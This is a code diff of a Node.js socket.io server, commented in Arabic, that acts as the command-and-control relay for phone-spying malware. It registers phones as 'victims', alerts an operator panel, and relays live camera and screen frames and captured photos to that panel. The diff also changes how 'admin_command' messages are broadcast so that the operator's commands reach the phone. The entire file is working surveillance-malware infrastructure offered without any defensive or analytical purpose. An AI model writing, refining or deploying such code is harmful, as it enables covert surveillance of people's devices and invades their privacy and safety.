@@ -9,40 +9,30 @@ const io = require('socket.io')(http, {
 app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });
 
 io.on('connection', (socket) => {
-    console.log('متصفح متصل:', socket.id);
+    console.log('[-] مستخدم جديد متصل');
 
+    // استقبال التبليغ من الهاتف وإرساله للوحة التحكم
     socket.on('victim_online', (data) => {
-        console.log('ضحية جديدة:', data.model);
-        socket.broadcast.emit('new_victim_alert', { id: socket.id, model: data.model });
+        console.log('[!] تبليغ جديد من: ' + data.model);
+        io.emit('new_victim_alert', { id: socket.id, model: data.model });
     });
 
-    // بث الفيديو المباشر من الكاميرا
+    // تمرير فريمات الفيديو (كاميرا وشاشة)
     socket.on('video_frame', (frame) => {
         socket.broadcast.emit('display_frame', { frame: frame });
     });
 
-    // تمرير الصور عالية الدقة
+    // تمرير الصور الملتقطة
     socket.on('photo_captured', (img) => {
         socket.broadcast.emit('display_photo', { img: img });
     });
 
-    // بث الشاشة (screen capture)
-    socket.on('screen_frame', (frame) => {
-        socket.broadcast.emit('display_frame', { frame: frame });
-    });
-
-    // تمرير الصوت المشفر (Base64)
-    socket.on('audio_chunk', (chunk) => {
-        socket.broadcast.emit('play_audio', { audio: chunk });
-    });
-
-    // أوامر التحكم
+    // تمرير الأوامر للهاتف
     socket.on('admin_command', (data) => {
-        console.log('أمر:', data.command);
-        socket.broadcast.emit(data.command, data);
+        io.emit(data.command, data); // إرسال الأمر للجميع لضمان وصوله للهاتف
     });
 });
 
 http.listen(process.env.PORT || 8080, '0.0.0.0', () => {
-    console.log('🚀 السيرفر شغال على بورت', process.env.PORT || 8080);
+    console.log('🚀 Server is running on port ' + (process.env.PORT || 8080));
 });
